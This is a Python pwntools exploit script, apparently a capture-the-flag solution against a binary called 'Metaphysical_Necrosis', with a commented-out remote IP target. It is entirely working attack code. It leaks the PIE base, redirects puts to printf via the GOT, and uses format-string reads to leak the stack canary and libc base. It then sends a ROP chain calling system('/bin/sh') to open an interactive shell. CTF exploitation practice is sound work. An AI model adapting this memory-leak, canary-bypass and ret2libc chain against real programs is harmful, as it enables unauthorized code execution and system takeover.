#coding=utf8
from pwn import*
p = process('Metaphysical_Necrosis')
elf = ELF('Metaphysical_Necrosis')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc = ELF('libc-2.23.so')
#p = remote('47.103.214.163',21003)

p.sendline('3')
p.send('\x90\x49') #String<8B From [RBP-10] To Down
p.sendline('') #getchar()
p.sendline('') #getchar()
p.sendline('FMYY') #name in BSS
p.sendline('0') #Array[160] [RBP-BO]
p.sendline('') #getchar()
p.sendline('') #getchar()
p.sendline('-21')
p.recvuntil('Terrorist Win\n')
pie = u64(p.recv(6).ljust(8,'\x00')) - 0x990
log.success('PIE:\t'+hex(pie))
binsh_addr = 0x2020E0 + pie
pop_rdi_ret = pie+0xF93
p.sendline(p64(pie+0x906)[0:6]) #&E99+var Modify The Puts To Printf
#-------------------
p.sendline('3')
p.send('\x90\x49')
p.sendline('')
p.sendline('')
p.sendline('PP%29$pNN%33$pQQ')
p.sendline('0')
p.recvuntil('PP')
canary = int(p.recvuntil('NN',drop = True),16)
log.success('Canary:\t' + hex(canary))
libcbase = int(p.recv(14),16)-libc.sym['__libc_start_main']-0xF0
system_addr = libcbase + libc.sym['system']
log.success('LibcBase:\t' + hex(libcbase))
p.sendline('') #getchar()
p.sendline('') #getchar()
p.sendline('0')
#----------------------
p.sendline('3')
p.send('\x90\x49')
p.sendline('') #getchar()
p.sendline('') #getchar()
p.sendline('/bin/sh\x00')
p.sendline('-2147000038')
for i in range(21):
	p.sendline('0')
p.send(p64(canary))
p.sendline('0')
p.sendline(p64(pop_rdi_ret))
p.sendline(p64(binsh_addr)) #binsh_addr <-name
p.sendline(p64(system_addr))
p.sendline('')
p.sendline('')
p.sendline('0')
p.interactive()
